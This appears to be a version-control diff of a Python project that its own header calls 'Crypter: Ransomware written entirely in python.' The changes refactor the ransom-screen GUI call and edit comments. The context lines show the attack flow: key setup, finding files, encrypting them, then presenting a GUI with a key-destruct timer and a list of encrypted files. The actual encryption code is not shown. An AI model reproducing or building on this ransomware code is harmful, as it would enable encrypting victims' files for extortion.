@@ -2,7 +2,6 @@
 @summary: Crypter: Ransomware written entirely in python.
 @author: MLS
 @version: 1.70
-@todo: Adjust BuildConfig to be an included data file for runtime config 
 '''
 
 # Import libs
@@ -46,6 +45,7 @@ class Crypter(Base.Base):
       self.Crypt.init_keys()
       file_list = self.find_files()
       # Start encryption
+      # TODO Restore this
       self.encrypt_files(file_list)
       # Present GUI
       self.start_gui()
@@ -107,13 +107,12 @@ class Crypter(Base.Base):
     start_time = self.get_start_time()
     
     app = wx.App()
-    #sys._MEIPASS = "..\\..\\build_script\\images"
-    crypter_gui = Gui.MyFrame1(None, 
-                               sys._MEIPASS, 
-                               self.KEY_DESTRUCT_TIME_SECONDS, 
-                               start_time,
-                               self.encrypted_file_list,
-                               self)
+    sys._MEIPASS = "..\\build\\images"
+    crypter_gui = Gui.Gui(
+        image_path=sys._MEIPASS, 
+        start_time=start_time,
+        encrypted_file_list=self.encrypted_file_list,
+        decrypter=self)
                                
     crypter_gui.Show()
     app.MainLoop()
